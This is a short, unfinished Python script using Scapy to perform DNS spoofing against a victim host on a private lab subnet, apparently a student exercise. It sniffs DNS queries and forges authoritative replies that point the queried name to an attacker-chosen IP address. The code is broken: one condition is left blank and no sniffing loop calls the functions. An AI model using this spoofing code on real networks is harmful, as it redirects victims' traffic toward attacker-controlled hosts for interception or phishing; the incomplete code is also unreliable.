from scapy.all import *

victimIP = "192.168.56.101"
spoofedIP = "192.168.56.102"


#have to find DNS packets that is coming out of victim's IP
def dnsSniff( packet ) : 
    if packet.haslayer(DNS):
        dnsPacket = packet[DNS]
        if dnsPacket.qr == :
            

#use sniffed packet
def dnsResponse ( packet ) :

    responsePacket = (
        IP(src = packet[IP].dst, dst = victimIP) /
        UDP(sport = packet[UDP].dport, dport = packet[UDP].sport) /
        DNS(id= packet[DNS].id, qr = 1, qd = packet[DNS].qd, aa = 1, 
            #use DNSRR, response data from the DNS server
            an = DNSRR(
               packet[DNS].qd.qname,
               packet[DNS].qd.qtype,
               packet[DNS].qd.qclass,
               ttl = 10,
               rdata = spoofedIP #where we want it to go, spoofed IP
            ))
    )   
    print "DNS spoofed"
    send(responsePacket)
    print "Spoofed DNS, Different IP address is sent"
    return

    
    
